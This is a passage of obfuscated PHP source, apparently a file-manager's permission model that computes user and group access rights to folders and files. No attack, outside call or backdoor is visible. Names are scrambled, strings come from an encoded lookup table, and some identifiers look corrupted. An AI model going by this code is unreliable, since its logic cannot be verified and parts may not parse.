($µçÖ¹†[$¡¡‚¸ßÉ[2164]] as $ºÍáÎ¶) { $ÌÒ™òÍ­ = $ºÍáÎ¶[$¡¡‚¸ßÉ[544]]; $–áúŒÌ’ = $ºÍáÎ¶[$¡¡‚¸ßÉ[1771]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ëûû’• = $ºÍáÎ¶[$¡¡‚¸ßÉ[1771]] ? $ºÍáÎ¶[$¡¡‚¸ßÉ[1771]] : $ºÍáÎ¶[$¡¡‚¸ßÉ[1972]]; if ($ºÍáÎ¶[$¡¡‚¸ßÉ[1771]] && $ºÍáÎ¶[$¡¡‚¸ßÉ[1771]] == $ÈÓ»Áµ°) { continue; } $‘ûşâ±İ[] = array($¡¡‚¸ßÉ[193] => $µçÖ¹†[$¡¡‚¸ßÉ[193]], $¡¡‚¸ßÉ[190] => $–áúŒÌ’, $¡¡‚¸ßÉ[573] => intval($ëûû’•), $¡¡‚¸ßÉ[2080] => isset($ÌÒ™òÍ­[$¡¡‚¸ßÉ[477]]) ? intval($ÌÒ™òÍ­[$¡¡‚¸ßÉ[477]]) : 0, $¡¡‚¸ßÉ[2144] => isset($ÌÒ™òÍ­[$¡¡‚¸ßÉ[2144]]) ? intval($ÌÒ™òÍ­[$¡¡‚¸ßÉ[2144]]) : -1); } $‘ûşâ±İ[] = array($¡¡‚¸ßÉ[193] => $µçÖ¹†[$¡¡‚¸ßÉ[193]], $¡¡‚¸ßÉ[190] => SourceModel::TYPE_USER, $¡¡‚¸ßÉ[573] => intval($ÈÓ»Áµ°), $¡¡‚¸ßÉ[2080] => intval($¨ÓÅ¤ÜË), $¡¡‚¸ßÉ[2144] => -1); $this->where(array($¡¡‚¸ßÉ[493] => $µçÖ¹†[$¡¡‚¸ßÉ[193]]))->delete(); $this->addAll($‘ûşâ±İ); } return !0; } public function get($õÃğ¶î®) { $‚Ğ×óú = $this->getSourceList(array($õÃğ¶î®), !0); return $‚Ğ×óú[0]; } public function getSourceList($Ç´‚›ì, $ãÏÃÔÊ¬ = false, $„Ûí¬â = false) { $ëˆïúé =& $_SERVER[°‰†òö¯]; if (!$Ç´‚›ì) { return array(); } $Íí‰Š¿ = Model($ëˆïúé[1419]); if (!$ãÏÃÔÊ¬ && count($Ç´‚›ì) == 1) { $ãÏÃÔÊ¬ = array(); $ãÏÃÔÊ¬[$Ç´‚›ì[0]] = $Íí‰Š¿->sourceInfo($Ç´‚›ì[0]); } if (!$ãÏÃÔÊ¬) { $‘¢È˜®º = array($ëˆïúé[493] => array($ëˆïúé[494], $Ç´‚›ì)); $ãÏÃÔÊ¬ = $Íí‰Š¿->field($ëˆïúé[2168])->where($‘¢È˜®º)->select(); $ãÏÃÔÊ¬ = array_to_keyvalue($ãÏÃÔÊ¬, $ëˆïúé[193]); } $£áÏËëÏ = $Ç´‚›ì; foreach ($ãÏÃÔÊ¬ as $úŒ„††¦ => $êª×˜áñ) { $»Õøä¢¸ = $Íí‰Š¿->parentLevelArray($êª×˜áñ[$ëˆïúé[588]]); $£áÏËëÏ = array_merge($£áÏËëÏ, array($úŒ„††¦), array_reverse($»Õøä¢¸)); } $£áÏËëÏ = array_values(array_unique($£áÏËëÏ)); if (!$£áÏËëÏ) { return array(); } $ïú×Ä¶£ = $this->sourceAuthSelect($£áÏËëÏ); $ª‡½¾¦Ã = array(); foreach ($£áÏËëÏ as $ì÷èÇ«) { if (isset($ïú×Ä¶£[$ì÷èÇ«])) { $ª‡½¾¦Ã[$ì÷èÇ«] = $ïú×Ä¶£[$ì÷èÇ«]; } } $õú»Š›Æ = $this->userIsRoot($„Ûí¬â); $ÖºıÀ‘î = AuthModel::authAll(); $‰‹šìğ = array($ëˆïúé[490] => $ÖºıÀ‘î, $ëˆïúé[2169] => array($ëˆïúé[495] => 0, $ëˆïúé[1978] => $ÖºıÀ‘î, $ëˆïúé[496] => LNG($ëˆïúé[2170]), $ëˆïúé[1995] => $ëˆïúé[2171])); $ù™¦í£ø = array(); foreach ($ãÏÃÔÊ¬ as $ì÷èÇ« => $“ì°…á) { if ($õú»Š›Æ && $GLOBALS[$ëˆïúé[6]][$ëˆïúé[1991]]) { $ù™¦í£ø[$ì÷èÇ«] = $‰‹šìğ; continue; } $ù™¦í£ø[$ì÷èÇ«] = $this->makeSourceAuth($“ì°…á, $ª‡½¾¦Ã, $„Ûí¬â); } return $ù™¦í£ø; } public function authDeepCheck($ÖÌ§¶¶€, $Ë§şÜ²İ = false) { $Ò°ã«ˆÇ =& $_SERVER[°‰†òö¯]; $Ë§şÜ²İ = $Ë§şÜ²İ ? $Ë§şÜ²İ : USER_ID; $ö×êÊ¢º = $this->makeAuthDeep($Ë§şÜ²İ); if (!in_array($ÖÌ§¶¶€, $ö×êÊ¢º[$Ò°ã«ˆÇ[2172]])) { return !1; } $İ¶´ë§¶ = array(); foreach ($ö×êÊ¢º[$Ò°ã«ˆÇ[2173]] as $¹àú¬˜É => $ô÷Á©Ì›) { if (!in_array($ÖÌ§¶¶€, $ô÷Á©Ì›)) { continue; } $İ¶´ë§¶[] = $¹àú¬˜É; } if (!$İ¶´ë§¶) { return !1; } $Ô§Ï¯“Ò = $İ¶´ë§¶ ? $İ¶´ë§¶[0] : $ÖÌ§¶¶€; return array($Ò°ã«ˆÇ[490] => -1, $Ò°ã«ˆÇ[544] => array($Ò°ã«ˆÇ[495] => $Ò°ã«ˆÇ[1271], $Ò°ã«ˆÇ[1978] => $Ò°ã«ˆÇ[230], $Ò°ã«ˆÇ[496] => LNG($Ò°ã«ˆÇ[2174]), $Ò°ã«ˆÇ[1995] => $Ò°ã«ˆÇ[2175]), $Ò°ã«ˆÇ[2176] => LNG($Ò°ã«ˆÇ[2177]), $Ò°ã«ˆÇ[2178] => $this->sourceAuthInfo($Ô§Ï¯“Ò)); } protected function makeAuthDeep($¼¬úÀÇ¨ = false) { $¶áÖò… =& $_SERVER[°‰†òö¯]; static $é‚ßÛ®” = array(); $¼¬úÀÇ¨ = $¼¬úÀÇ¨ ? $¼¬úÀÇ¨ : USER_ID; if (isset($é‚ßÛ®”[$¼¬úÀÇ¨])) { return $é‚ßÛ®”[$¼¬úÀÇ¨]; } $ªùùğ¡ = Model($¶áÖò…[2179])->listData(); $¥Ü‹ñù¡ = array(); foreach ($ªùùğ¡ as $‰šÁ¯²²) { if ($‰šÁ¯²²[$¶áÖò…[489]] == 0 && $‰šÁ¯²²[$¶áÖò…[1994]] == $¶áÖò…[91]) { $¥Ü‹ñù¡[] = $‰šÁ¯²²[$¶áÖò…[477]]; } } $ı°´Ñâ‰ = $this->userGroupParents($¼¬úÀÇ¨); $ü–Ÿ…Ÿø = array($¶áÖò…[190] => SourceModel::TYPE_USER, $¶áÖò…[573] => $¼¬úÀÇ¨); if ($ı°´Ñâ‰) { $ü–Ÿ…Ÿø = array(array($¶áÖò…[190] => SourceModel::TYPE_USER, $¶áÖò…[573] => $¼¬úÀÇ¨), array($¶áÖò…[190] => SourceModel::TYPE_GROUP, $¶áÖò…[573] => array($¶áÖò…[494], $ı°´Ñâ‰)), $¶áÖò…[1075] => $¶áÖò…[2074]); } $şì‚”¸û = $this->field($¶áÖò…[2180])->where($ü–Ÿ…Ÿø)->select(); $³ûüèÜÕ = array(); $‚şäçŒŒ = array_to_keyvalue_group($şì‚”¸û, $¶áÖò…[193]); foreach ($‚şäçŒŒ as $”ÜÚ“Ùı => $Û­Çí¬²) { $½äáÉ¾Å = $this->authArrayCheck($Û­Çí¬², $¼¬úÀÇ¨); if ($½äáÉ¾Å[$¶áÖò…[490]] > 0) { $³ûüèÜÕ[] = $”ÜÚ“Ùı . $¶áÖò…[12]; } } if ($ı°´Ñâ‰) { $½ºø¾à§ = Model($¶áÖò…[589]); foreach ($ı°´Ñâ‰ as $øæÃÆé›) { $Î¬Œüõ = $½ºø¾à§->getInfo($øæÃÆé›); if (!$Î¬Œüõ || !is_array($Î¬Œüõ[$¶áÖò…[90]])) { continue; } $³ûüèÜÕ[] = $Î¬Œüõ[$¶áÖò…[90]][$¶áÖò…[193]]; } } $ñóñ×ˆ„ = array(); $ÎöåŸ¿ = $ı°´Ñâ‰; $—Óğà•¯ = Model($¶áÖò…[1419]); $½ºø¾à§ = Model($¶áÖò…[589]); $Âé¤™ Ò = array(); $œöŒïõ = array(); $‰Œ€ÜÁé = array(); $¤ÎœÙ‚ = array(); if ($³ûüèÜÕ) { $ªˆÀ°…Ì = $—Óğà•¯->where(array($¶áÖò…[193] => array($¶áÖò…[494], $³ûüèÜÕ)))->select(); foreach ($ªˆÀ°…Ì as $éÉŸ­¡Ÿ) { if ($éÉŸ­¡Ÿ[$¶áÖò…[507]] == $¶áÖò…[91]) { continue; } $ÇäÑÆ’ = $—Óğà•¯->parentLevelArray($éÉŸ­¡Ÿ[$¶áÖò…[588]]); $ñóñ×ˆ„ = array_merge($ñóñ×ˆ„, $ÇäÑÆ’); $ÎöåŸ¿[] = $éÉŸ­¡Ÿ[$¶áÖò…[573]]; $Âé¤™ Ò[$éÉŸ­¡Ÿ[$¶áÖò…[193]]] = $ÇäÑÆ’; $œöŒïõ[$éÉŸ­¡Ÿ[$¶áÖò…[193]]] = $éÉŸ­¡Ÿ[$¶áÖò…[573]]; } } $ÎöåŸ¿ = array_values(array_unique($ÎöåŸ¿)); $€³±û‹â = $ÎöåŸ¿; foreach ($€³±û‹â as $øæÃÆé›) { $Î¬Œüõ = $½ºø¾à§->getInfo($øæÃÆé›); $ÇäÑÆ’ = $—Óğà•¯->parentLevelArray($Î¬Œüõ[$¶áÖò…[588]]); $ÎöåŸ¿ = array_merge($ÎöåŸ¿, $ÇäÑÆ’); } $ÎöåŸ¿ = array_values(array_unique($ÎöåŸ¿)); foreach ($ÎöåŸ¿ as $øæÃÆé›) { $Î¬Œüõ = $½ºø¾à§->getInfo($øæÃÆé›); $ñóñ×ˆ„[] = $Î¬Œüõ[$¶áÖò…[90]][$¶áÖò…[193]]; $‰Œ€ÜÁé[$øæÃÆé›] = $Î¬Œüõ[$¶áÖò…[90]][$¶áÖò…[193]]; $¤ÎœÙ‚[$øæÃÆé›] = $—Óğà•¯->parentLevelArray($Î¬Œüõ[$¶áÖò…[588]]); } foreach ($Âé¤™ Ò as $å¬¼»è => $½Şá»ïİ) { $§İé¸„æ = $œöŒïõ[$å¬¼»è]; if (!$§İé¸„æ || !$‰Œ€ÜÁé[$§İé¸„æ]) { continue; } $×¤õ¦£… = array(); foreach ($¤ÎœÙ‚[$§İé¸„æ] as $øæÃÆé›) { $×¤õ¦£…[] = $‰Œ€ÜÁé[$øæÃÆé›]; } $Âé¤™ Ò[$å¬¼»è] = array_merge($×¤õ¦£…, $½Şá»ïİ); } $ñóñ×ˆ„ = array_values(array_unique($ñóñ×ˆ„)); $õ®Œê¯Œ = array($¶áÖò…[2172] => $ñóñ×ˆ„, $¶áÖò…[2173] => $Âé¤™ Ò); $é‚ßÛ®”[$¼¬úÀÇ¨] = $õ®Œê¯Œ; return $õ®Œê¯Œ; } private function makeSourceAuth($É²¹ûÓ, $å¦µé·, $¥àŸ‡ı = false) { $üÜªÖ…Ğ =& $_SERVER[°‰†òö¯]; $õçÛ¯ƒ = $üÜªÖ…Ğ[91]; $²ÆäÛ’à = $É²¹ûÓ[$üÜªÖ…Ğ[573]]; $¡»Ô¬Ø = $É²¹ûÓ[$üÜªÖ…Ğ[190]] == SourceModel::TYPE_GROUP; $ä‡®®‘ß = $¡»Ô¬Ø ? $this->groupRootAuth($²ÆäÛ’à, $¥àŸ‡ı) : !1; if ($ä‡®®‘ß && Model($üÜªÖ…Ğ[575])->authCheckAction($ä‡®®‘ß[$üÜªÖ…Ğ[489]], $üÜªÖ…Ğ[1993])) { return $this->groupAuthInfo($ä‡®®‘ß, $²ÆäÛ’à); } $øÈ»«áú = Model($üÜªÖ…Ğ[1419])->parentLevelArray($É²¹ûÓ[$üÜªÖ…Ğ[588]]); $øÈ»«áú = array_merge(array($É²¹ûÓ[$üÜªÖ…Ğ[193]]), array_reverse($øÈ»«áú)); $©Ë›­Ö = !1; foreach ($øÈ»«áú as $Àé¦Õ¹‹) { if (!isset($å¦µé·[$Àé¦Õ¹‹])) { continue; } $‰¥”ë›» = $this->authMake($å¦µé·[$Àé¦Õ¹‹], $¥àŸ‡ı); if ($‰¥”ë›»[$üÜªÖ…Ğ[544]]) { $©Ë›­Ö = $‰¥”ë›»; break; } } if (!$¡»Ô¬Ø) { return $©Ë›­Ö; } if (!$©Ë›­Ö && $ä‡®®‘ß) { $©Ë›­Ö = $this->groupAuthInfo($ä‡®®‘ß, $²ÆäÛ’à); } if (!$©Ë›­Ö) { $úçãÕ¯» = Model($üÜªÖ…Ğ[589])->getInfo($²ÆäÛ’à); $†ÎÒÜ÷ = explode($üÜªÖ…Ğ[50], trim($úçãÕ¯»[$üÜªÖ…Ğ[588]], $üÜªÖ…Ğ[50])); $†ÎÒÜ÷ = array_reverse($†ÎÒÜ÷); foreach ($†ÎÒÜ÷ as $ÓÕ˜ªÂĞ) { if ($ÓÕ˜ªÂĞ == $üÜªÖ…Ğ[230] || $ÓÕ˜ªÂĞ == $õçÛ¯ƒ) { continue; } $•ìõè†Ù = $this->groupRootAuth($ÓÕ˜ªÂĞ, $¥àŸ‡ı); if (!$•ìõè†Ù) { continue; } $©Ë›­Ö = $this->groupAuthInfo($•ìõè†Ù, $ÓÕ˜ªÂĞ); break; } } if (!$©Ë›­Ö || $©Ë›­Ö[$üÜªÖ…Ğ[490]] <= 0) { $€á“”–¼ = $this->authDeepCheck($É²¹ûÓ[$üÜªÖ…Ğ[193]], $¥àŸ‡ı); if ($€á“”–¼) { $©Ë›­Ö = $€á“”–¼; } } return $©Ë›­Ö; } private function userIsRoot($‚‡ÇòŠ‰ = false) { $˜ö¾ÆÎ =& $_SERVER[°‰†òö¯]; if (!$‚‡ÇòŠ‰ && KodUser::isRoot()) { return !0; } $Ç­ŞçÌ = Model($˜ö¾ÆÎ[601])->getInfo($‚‡ÇòŠ‰); $ÌƒÄ¥«¤ = Model($˜ö¾ÆÎ[2181])->listData($Ç­ŞçÌ[$˜ö¾ÆÎ[2182]]); if ($ÌƒÄ¥«¤ && $ÌƒÄ¥«¤[$˜ö¾ÆÎ[579]][$˜ö¾ÆÎ[2183]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¾£«»ÒŠ) { $ô«³Û¦‹ =& $_SERVER[°‰†òö¯]; $“Ÿ¢ûØ = Model($ô«³Û¦‹[1419]); $Æ£œ”—˜ = $“Ÿ¢ûØ->sourceInfo($¾£«»ÒŠ); if (!$Æ£œ”—˜) { return !1; } $“Ÿ¢ûØ->groupPathDisplay($Æ£œ”—˜); $¢Á¾¨Œ = array($Æ£œ”—˜); $¢Á¾¨Œ = $“Ÿ¢ûØ->_listAppendPath($¢Á¾¨Œ); $Æ£œ”—˜ = $¢Á¾¨Œ[0]; $•êñĞìÒ = $Æ£œ”—˜[$ô«³Û¦‹[586]]; if (isset($Æ£œ”—˜[$ô«³Û¦‹[594]])) { $¹ªŸ‹íî = explode($ô«³Û¦‹[8], trim($Æ£œ”—˜[$ô«³Û¦‹[586]], $ô«³Û¦‹[8])); array_shift($¹ªŸ‹íî); $•êñĞìÒ = $Æ£œ”—˜[$ô«³Û¦‹[592]] . $ô«³Û¦‹[2184] . implode($ô«³Û¦‹[8], $¹ªŸ‹íî); } return array($ô«³Û¦‹[496] => $Æ£œ”—˜[$ô«³Û¦‹[32]], $ô«³Û¦‹[87] => KodIO::make($Æ£œ”—˜[$ô«³Û¦‹[193]]), $ô«³Û¦‹[2185] => $•êñĞìÒ); } private function groupAuthInfo($¡†Ë†ØÔ, $È†ˆÒ®) { $®äù»·¹ =& $_SERVER[°‰†òö¯]; $ùßİ§ä = Model($®äù»·¹[589])->getInfo($È†ˆÒ®); return array($®äù»·¹[2186] => intval($¡†Ë†ØÔ[$®äù»·¹[489]]), $®äù»·¹[2169] => $¡†Ë†ØÔ, $®äù»·¹[2187] => LNG($®äù»·¹[2188]), $®äù»·¹[2178] => array($®äù»·¹[496] => $ùßİ§ä[$®äù»·¹[32]], $®äù»·¹[87] => KodIO::make($ùßİ§ä[$®äù»·¹[90]][$®äù»·¹[193]]), $®äù»·¹[2185] => $ùßİ§ä[$®äù»·¹[593]])); } protected function groupRootAuth($Ğáü¬””, $©£¡÷× = false) { $¶âÔÀ­ =& $_SERVER[°‰†òö¯]; $©£¡÷× = $©£¡÷× ? $©£¡÷× : USER_ID; $€“Î€‰£ = $©£¡÷× . $¶âÔÀ­[2189] . $Ğáü¬””; static $¾¸ë‰ı = array(); if (isset($¾¸ë‰ı[$€“Î€‰£])) { return $¾¸ë‰ı[$€“Î€‰£]; } $ÈæÎ”–­ = Model($¶âÔÀ­[589])->getInfo($Ğáü¬””); $˜ ‹Ñ—’ = $this->userGroupList($©£¡÷×); $ıî’¨‹† = isset($˜ ‹Ñ—’[$Ğáü¬””]) ? $˜ ‹Ñ—’[$Ğáü¬””][$¶âÔÀ­[489]] : !1; if ($ıî’¨‹† && Model($¶âÔÀ­[575])->authCheckAction($ıî’¨‹†[$¶âÔÀ­[489]], $¶âÔÀ­[1993])) { $¾¸ë‰ı[$€“Î€‰£] = $ıî’¨‹†; return $ıî’¨‹†; } $ïüÜ¯åˆ = $this->sourceAuthSelect($ÈæÎ”–­[$¶âÔÀ­[90]][$¶âÔÀ­[193]]); $ÛÁÔ… = $ïüÜ¯åˆ ? $this->authMake($ïüÜ¯åˆ, $©£¡÷×) : !1; $è¥šäÛ = $ÛÁÔ… ? $ÛÁÔ…[$¶âÔÀ­[544]] : !1; $¾¸ë‰ı[$€“Î€‰£] = $è¥šäÛ ? $è¥šäÛ : $ıî’¨‹†; return $¾¸ë‰ı[$€“Î€‰£]; } public function authOwnerApply($å¿ºÇíª) { $Ç¨·àš… =& $_SERVER[°‰†òö¯]; if (empty($å¿ºÇíª[$Ç¨·àš…[489]]) || isset($å¿ºÇíª[$Ç¨·àš…[2190]]) && $å¿ºÇíª[$Ç¨·àš…[2190]]) { return $å¿ºÇíª; } if (AuthModel::authCheckRoot($å¿ºÇíª[$Ç¨·àš…[489]][$Ç¨·àš…[490]])) { return $å¿ºÇíª; } $š¨æë¾Î = Model($Ç¨·àš…[1419])->parentLevelArray($å¿ºÇíª[$Ç¨·àš…[588]]); $š¨æë¾Î = array_merge(array($å¿ºÇíª[$Ç¨·àš…[193]]), array_reverse($š¨æë¾Î)); $›Ší®İŠ = $this->sourceAuthSelect($š¨æë¾Î); $û«Õ»Ş¸ = array(); $à‰ìâÍ = array(); foreach ($›Ší®İŠ as $¹÷©¼ÂÖ => $¾Åëá„®) { $Ï““–Ü = $this->authFolderOwnerUser($¾Åëá„®); $û«Õ»Ş¸[$¹÷©¼ÂÖ] = $Ï““–Ü; $à‰ìâÍ = array_merge($à‰ìâÍ, $Ï““–Ü[$Ç¨·àš…[669]]); if ($Ï““–Ü[$Ç¨·àš…[2191]]) { break; } } if (count($à‰ìâÍ) == 0) { $à‰ìâÍ = $this->authFolderOwnerGroup($å¿ºÇíª[$Ç¨·àš…[573]]); } $à‰ìâÍ = array_unique($à‰ìâÍ); if (AuthModel::authCheckRoot($å¿ºÇíª[$Ç¨·àš…[489]][$Ç¨·àš…[490]])) { $à‰ìâÍ[] = USER_ID; } $å¿ºÇíª[$Ç¨·àš…[489]][$Ç¨·àš…[2192]] = Model($Ç¨·àš…[581])->userListInfo($à‰ìâÍ); return $å¿ºÇíª; } private function authFolderOwnerGroup($×æáÎµ) { $ìø½ŸÎÇ =& $_SERVER[°‰†òö¯]; $úƒ›® = Model($ìø½ŸÎÇ[2066])->where(array($ìø½ŸÎÇ[1972] => $×æáÎµ))->select(); $¤ºÆßË¥ = array(); if (!$úƒ›®) { return $¤ºÆßË¥; } foreach ($úƒ›® as $™—¡ÃÈ) { $·öä£ıº = $this->authInfo($™—¡ÃÈ); if (AuthModel::authCheckRoot($·öä£ıº[$ìø½ŸÎÇ[489]])) { $¤ºÆßË¥[] = $™—¡ÃÈ[$ìø½ŸÎÇ[1771]]; } } return $¤ºÆßË¥; } private function authFolderOwnerUser($ó€“Šã®) { $Éêêü =& $_SERVER[°‰†òö¯]; $÷ÌğÎœ = array(); $ÈÆ‘†ãŠ = !1; foreach ($ó€“Šã® as $»§û½â¸) { $Û¹Øšåé = $this->authInfo($»§û½â¸); if ($»§û½â¸[$Éêêü[573]] == $Éêêü[230]) { $ÈÆ‘†ãŠ = !0; } if ($»§û½â¸[$Éêêü[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Û¹Øšåé[$Éêêü[489]])) { $÷ÌğÎœ[] = $»§û½â¸[$Éêêü[573]]; } } } return array($Éêêü[669] => $÷ÌğÎœ, $Éêêü[2191] => $ÈÆ‘†ãŠ); } public function authMake($şÄŞ²†Ç, $º»ÚÁ§ï = false) { $Î€•»‚ˆ =& $_SERVER[°‰†òö¯]; $¶ÑŒôÜ— = $this->authArrayCheck($şÄŞ²†Ç, $º»ÚÁ§ï); if ($¶ÑŒôÜ—[$Î€•»‚ˆ[2193]]) { $¶ÑŒôÜ—[$Î€•»‚ˆ[2193]] = $this->sourceAuthInfo($¶ÑŒôÜ—[$Î€•»‚ˆ[2193]]); } return $¶ÑŒôÜ—; } public function authArrayCheck($‡ßøó®Ó, $É„©¸»Ç = false) { $ÈÓ¨¬™¸ =& $_SERVER[°‰†òö¯]; if (!$‡ßøó®Ó) { return array($ÈÓ¨¬™¸[490] => 0, $ÈÓ¨¬™¸[544] => !1); } $É„©¸»Ç = $É„©¸»Ç ? $É„©¸»Ç : USER_ID; $Ûµ‘…­® = 0; $ÔÖ³Ê‡à = 0; $ÄÀÔ‡é = 0; $µİ®·é = 0; $ç™Ûå‹ = 0; $½×İäÅ = 0; $é„ì¡Á = 1000; $œÉ›£³» = 0; $Æ±åç™à = 0; $¼²Òòë© = 0; $Éëı£¬‘ = 0; $ß’šõÇ = array($ÈÓ¨¬™¸[193] => 0); foreach ($‡ßøó®Ó as $ß’šõÇ) { $£Ï‚ïö = $this->authInfo($ß’šõÇ); if (!$£Ï‚ïö) { continue; } $ú„ìí“½ = $ß’šõÇ[$ÈÓ¨¬™¸[573]]; $øÕÃß¿‰ = intval($£Ï‚ïö[$ÈÓ¨¬™¸[489]]); if ($ß’šõÇ[$ÈÓ¨¬™¸[190]] == SourceModel::TYPE_USER && $ú„ìí“½ == $É„©¸»Ç) { $Ûµ‘…­® = !0; $ÄÀÔ‡é = $£Ï‚ïö; $ÔÖ³Ê‡à = $øÕÃß¿‰; } else { if ($ß’šõÇ[$ÈÓ¨¬™¸[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ú„ìí“½, $É„©¸»Ç)) { $µİ®·é = !0; $ ²ß¶€ì = $this->groupStepToUserGroup($ú„ìí“½, $É„©¸»Ç); if ($ ²ß¶€ì < $é„ì¡Á) { $é„ì¡Á = $ ²ß¶€ì; $ç™Ûå‹ = $øÕÃß¿‰; $½×İäÅ = $£Ï‚ïö; $œÉ›£³» = $ú„ìí“½; } if ($ ²ß¶€ì == $é„ì¡Á && $øÕÃß¿‰ >= $ç™Ûå‹) { $ç™Ûå‹ = $øÕÃß¿‰; $½×İäÅ = $£Ï‚ïö; $œÉ›£³» = $ú„ìí“½; } } else { if ($ú„ìí“½ == $ÈÓ¨¬™¸[230]) { $Æ±åç™à = !0; $Éëı£¬‘ = $£Ï‚ïö; $¼²Òòë© = $øÕÃß¿‰; } } } } if ($Ûµ‘…­®) { $¸¸§êÍÌ = $ÔÖ³Ê‡à; $£Ï‚ïö = $ÄÀÔ‡é; $Ä¦…³»² = LNG($ÈÓ¨¬™¸[2194]); } else { if ($µİ®·é) { $¸¸§êÍÌ = $ç™Ûå‹; $£Ï‚ïö = $½×İäÅ; $†¿‹¤Ö = Model($ÈÓ¨¬™¸[589])->getInfo($œÉ›£³»); $Ä¦…³»² = $ÈÓ¨¬™¸[176] . $†¿‹¤Ö[$ÈÓ¨¬™¸[593]] . $ÈÓ¨¬™¸[2195] . LNG($ÈÓ¨¬™¸[2196]); } else { if ($Æ±åç™à) { $¸¸§êÍÌ = $¼²Òòë©; $£Ï‚ïö = $Éëı£¬‘; $Ä¦…³»² = LNG($ÈÓ¨¬™¸[2166]); } else { $¸¸§êÍÌ = 0; $£Ï‚ïö = !1; $Ä¦…³»² = $ÈÓ¨¬™¸[12]; } } } $ç‘ê®‘ä = array($ÈÓ¨¬™¸[2186] => intval($¸¸§êÍÌ), $ÈÓ¨¬™¸[2169] => $£Ï‚ïö, $ÈÓ¨¬™¸[2187] => $Ä¦…³»², $ÈÓ¨¬™¸[2178] => $ß’šõÇ[$ÈÓ¨¬™¸[193]]); return $ç‘ê®‘ä; } private function groupContainUser($ßµæàÛ, $¿ÜüÑÑ™ = false) { return in_array($ßµæàÛ, $this->userGroupParents($¿ÜüÑÑ™)); } private function groupStepToUserGroup($ÂÉ¨Ïƒ, $­¼Ø“Ş¨ = false) { $ÇÇªó =& $_SERVER[°‰†òö¯]; $ñŸµŞÙã = $this->userGroupList($­¼Ø“Ş¨); $ßÂä ² = 1000; $×ŸìØŸ… = $GLOBALS[$ÇÇªó[6]][$ÇÇªó[92]][$ÇÇªó[2079]] == 1; $±‘†â•Ú = $×ŸìØŸ… ? 3 : 2; foreach ($ñŸµŞÙã as $µ“³ù’) { if ($µ“³ù’[$ÇÇªó[1972]] == $ÂÉ¨Ïƒ) { return 0; } $ûçÓ—Ò = explode($ÇÇªó[50], trim($µ“³ù’[$ÇÇªó[588]], $ÇÇªó[50])); if ($ûçÓ—Ò[0] == $ÇÇªó[230] && count($ûçÓ—Ò) > $±‘†â•Ú) { $ìÏá­Ó = array_reverse(array_slice($ûçÓ—Ò, $±‘†â•Ú)); $Á¨ó–Ö… = array_search($ÂÉ¨Ïƒ, $ìÏá­Ó); if ($Á¨ó–Ö… !== !1 && $Á¨ó–Ö… + 1 <= $ßÂä ²) { $ßÂä ² = $Á¨ó–Ö… + 1; } } } return $ßÂä ²; } private function userGroupList($™ÕÅ¿ÑÈ = false) { $–öÊˆ¿ =& $_SERVER[°‰†òö¯]; static $€ÀãÌŸë = array(); if (isset($€ÀãÌŸë[$™ÕÅ¿ÑÈ])) { return $€ÀãÌŸë[$™ÕÅ¿ÑÈ]; } $ôÎ¸Ÿ² = Model($–öÊˆ¿[601])->getInfo($™ÕÅ¿ÑÈ); $€ÀãÌŸë[$™ÕÅ¿ÑÈ] = array_to_keyvalue($ôÎ¸Ÿ²[$–öÊˆ¿[2167]], $–öÊˆ¿[1972]); return $€ÀãÌŸë[$™ÕÅ¿ÑÈ]; } public function userGroupParents($ä×ÂÊÓ) { $ß’ÌšÆĞ =& $_SERVER[°‰†òö¯]; static $„µƒÄØ = array(); $ä×ÂÊÓ = $ä×ÂÊÓ ? $ä×ÂÊÓ : USER_ID; if (isset($„µƒÄØ[$ä×ÂÊÓ])) { return $„µƒÄØ[$ä×ÂÊÓ]; } $ıŸÅá¥± = $this->userGroupList($ä×ÂÊÓ); $¡ŒŠÃç = array(); $¸î‚”å = $GLOBALS[$ß’ÌšÆĞ[6]][$ß’ÌšÆĞ[92]][$ß’ÌšÆĞ[2079]] == 1; $Ü¤’êÄá = $¸î‚”å ? 3 : 2; foreach ($ıŸÅá¥± as $İùÊ«ÛŸ) { $ğ’ß¹Ë = array($İùÊ«ÛŸ[$ß’ÌšÆĞ[1972]]); $§–¬ºÃ = explode($ß’ÌšÆĞ[50], trim($İùÊ«ÛŸ[$ß’ÌšÆĞ[588]], $ß’ÌšÆĞ[50])); if ($§–¬ºÃ[0] == $ß’ÌšÆĞ[230] && count($§–¬ºÃ) > $Ü¤’êÄá) { $õ›ú™øá = array_slice($§–¬ºÃ, $Ü¤’êÄá); $ğ’ß¹Ë = array_merge($ğ’ß¹Ë, array_reverse($õ›ú™øá)); } $¡ŒŠÃç = array_merge($¡ŒŠÃç, $ğ’ß¹Ë); } $„µƒÄØ[$ä×ÂÊÓ] = array_unique($¡ŒŠÃç); return $„µƒÄØ[$ä×ÂÊÓ]; } public function authTargetInfoMake($íÉ‚Æ ”) { $õú¬©Ìš =& $_SERVER[°‰†òö¯]; $’Üİ¢ = array(); $×Å›‡òØ = array(); foreach ($íÉ‚Æ ” as $Ù«âßò§) { if ($Ù«âßò§[$õú¬©Ìš[190]] == SourceModel::TYPE_USER) { $’Üİ¢[] = intval($Ù«âßò§[$õú¬©Ìš[573]]); } else { if ($Ù«âßò§[$õú¬©Ìš[190]] == SourceModel::TYPE_GROUP) { $×Å›‡òØ[] = intval($Ù«âßò§[$õú¬©Ìš[573]]); } } } if ($’Üİ¢) { $’Üİ¢ = Model($õú¬©Ìš[581])->userListInfo($’Üİ¢); } if ($×Å›‡òØ) { $¸÷å‰ = array($õú¬©Ìš[2064] => array($õú¬©Ìš[494], $×Å›‡òØ)); $×Å›‡òØ = Model($õú¬©Ìš[589])->field($õú¬©Ìš[2197])->where($¸÷å‰)->select(); $×Å›‡òØ = array_to_keyvalue($×Å›‡òØ, $õú¬©Ìš[1972]); } return array($õú¬©Ìš[2198] => $’Üİ¢, $õú¬©Ìš[2199] => $×Å›‡òØ); } public function authInfo($¥ªáùÆ²) { $¯¢¤å» =& $_SERVER[°‰†òö¯]; if ($¥ªáùÆ²[$¯¢¤å»[2080]]) { $«òôíÚ = Model($¯¢¤å»[575])->listData($¥ªáùÆ²[$¯¢¤å»[2080]]); if (!$«òôíÚ) { return !1; $Ê¤îè™ß = Model($¯¢¤å»[575])->listData(); $œëóÂí  = array_filter_by_field($Ê¤îè™ß, $¯¢¤å»[489], $¯¢¤å»[230]); return $œëóÂí ; } $–Œëˆ€ª = array_field_key($«òôíÚ, 